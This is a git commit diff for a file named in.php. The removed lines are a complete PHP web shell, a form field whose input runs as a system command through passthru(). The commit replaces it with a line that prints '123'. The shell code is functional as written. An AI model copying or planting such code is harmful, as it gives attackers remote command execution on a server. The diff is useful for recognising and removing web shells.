98201687d2ae4f119c99f6ee3b90ef266a27034a
vladislavponomaryov <44458397+vladislavponomaryov@users.noreply.github.com>
2020-11-01 15:34:39 +0600

    Update in.php

--- in.php
+++ in.php
@@ -1,17 +1,3 @@
-echo "
-<html>
-<head>
-<title>sh</title>
-</head>
-<body>";
-echo "<form method=post>";
-echo "<input type=text name=cmd size=100>";
-echo "</form>";
-echo "<pre>";
-if ((!$_POST['cmd']) || ($_POST['cmd']=="")) {
-$_POST['cmd']="id;pwd;uname -a;ls -la";
-}
-echo "".passthru($_POST['cmd'])."</pre>
-</body>
-</html>";
-
+<?php
+echo 123;
+?>
